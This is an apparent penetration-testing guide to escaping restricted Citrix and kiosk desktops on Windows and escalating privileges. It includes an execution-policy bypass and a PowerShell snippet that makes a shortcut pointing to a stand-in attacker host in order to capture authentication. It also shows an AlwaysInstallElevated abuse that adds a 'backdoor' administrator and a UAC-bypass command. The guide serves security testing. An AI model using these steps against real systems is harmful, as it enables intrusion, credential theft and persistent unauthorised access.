### Content

- [Overview](#overview)
- [Bypassing Path Restrictions](#bypassing-path-restrictions)
	- [Accessing Local Files](#accessing-local-files)
	- [Accessing Remote Shares](#accessing-remote-shares)
	- [Alternate Explorer](#alternate-explorer)
	- [Alternate Registry Editors](#alternate-registry-editors)
- [Modify Shortcut File](#modify-shortcut-file)
- [Script Execution](#script-execution)
- [Escalating Privileges](#escalating-privileges)
	- [Abusing Always Install Elevated](#abusing-always-install-elevated)
	- [Bypassing UAC](#bypassing-uac)

> [!Tip] Tips
> - [Breaking out of Citrix and other Restricted Desktop environments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
> - [Breaking out of Windows Environments](https://node-security.com/posts/breaking-out-of-windows-environments/)
> 
> PowerShell execution policy bypassing `powershell -ep bypass`

---
#### Overview

Organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM and Kiosk to offer remote access solutions in order to meet their business requirements.

lock-down measures are implemented in their desktop environments to minimize the potential impact of malicious staff members and compromised accounts on overall domain security.

Basic Methodology for break-out:

1. Gain access to a `Dialog Box`.
2. Exploit the Dialog Box to achieve `command execution`.
3. `Escalate privileges` to gain higher levels of access.

---
### Bypassing Path Restrictions

<div style="display: flex; justify-content: center;"><img src="/assets/bypassing_citrix_path_restrictions_1.png" ></div>

This indicates that group policy has been implemented to restrict users from browsing directories in the `C:\` drive using File Explorer.

It is possible to utilize windows dialog boxes as a means to bypass the restrictions imposed by group policy.

Many desktop applications deployed via Citrix are equipped with functionalities that enable them to interact with files on the operating system. Features like Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print, usually provide an attacker with an opportunity to invoke a Windows dialog box.
There are multiple ways to open dialog box in windows using tools such as Paint, Notepad, Wordpad, etc.

Using `MS Paint` by opening it from the start menu.

<div style="display: flex; justify-content: center;"><img src="/assets/bypassing_citrix_path_restrictions_2.png" ></div>
<br>
<div style="display: flex; justify-content: center;"><img src="/assets/bypassing_citrix_path_restrictions_3.png" ></div>

##### Accessing Local Files

<div style="display: flex; justify-content: center;"><img src="/assets/bypassing_citrix_path_restrictions_4.png" ></div>

Utilizing the [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path within the Windows dialog box.
After writing the desired path, hit enter to go there, then you can open what ever file you want by right click and hit open with.

##### Accessing Remote Shares

<div style="display: flex; justify-content: center;"><img src="/assets/bypassing_citrix_path_restrictions_5.png" ></div>

##### Alternate Explorer

Alternative File System Editors like `Q-Dir` or [Explorer++](https://explorerplusplus.com/) can be employed, which can bypass the folder restrictions enforced by group policy, allowing navigate and access files and directories that would otherwise be restricted within the standard File Explorer environment.

<div style="display: flex; justify-content: center;"><img src="/assets/bypassing_citrix_path_restrictions_6.png" ></div>

##### Alternate Registry Editors

If the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions.
[Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/) are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy.

---
### Modify Shortcut File

By modifying existing Windows shortcuts and setting a desired executable's path in the `Target` field.

<div style="display: flex; justify-content: center;"><img src="/assets/bypassing_citrix_path_restrictions_7.png" ></div>
<br>
<div style="display: flex; justify-content: center;"><img src="/assets/bypassing_citrix_path_restrictions_8.png" ></div>

After clicking apply and try to access the shortcut, CMD window will pop up. 

In cases where an existing shortcut file is unavailable, generate and transfer a malicious new shortcut by using this PowerShell snippet:

```PowerShell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

---
### Script Execution

When scripts with extensions such as `.bat`, `.vbs`, or `.ps` are configured to automatically execute their code using their respective interpreters, We can abuse it:

- Create a new text file and name it `evil.bat`.
- Open `evil.bat` with a text editor such as Notepad.
- Input the command `cmd` into the file.
- Save the file

Executing `evil.bat` will pop up a command prompt window.

---
### Escalating Privileges

[Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) can also be employed to identify potential security issues and vulnerabilities within the operating system.

Run `Invkoe-AllChecks` from `PowerUp` which check for all escalation opportunities.

#### Abusing Always Install Elevated

1. Check If it's set

Using `PowerUp.ps1`, we find that if [Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) registry key is present and set.

```PowerShell
PS C:\Public\Tools> Import-Module .\PowerUp.ps1
PS C:\Public\Tools> Get-RegAlwaysInstallElevated
```

Checking it for the current user hive key and the local machine hive key with CMD.

```CMD
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1


C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1
```

2. Use `Write-UserAddMSI` function from `PowerUp` to create an `.msi` installation file.

```PowerShell
PS C:\Public\Tools> Import-Module .\PowerUp.ps1
PS C:\Public\Tools> Write-UserAddMSI
	
Output Path
-----------
UserAdd.msi
```

Now we can execute `UserAdd.msi` and create a new user `backdoor:P@ssw0r6` under `Administrators` group.
Then you can run commands as that use by using `runas /user:backdoor cmd`

#### Bypassing UAC

Accessing the `C:\users\Administrator` directory remains unfeasible due (UAC) presence.

Numerous [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism.

```PowerShell
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

New PowerShell window will be opened with higher privileges and we can confirm it by utilizing the command `whoami /all` or `whoami /priv`.

---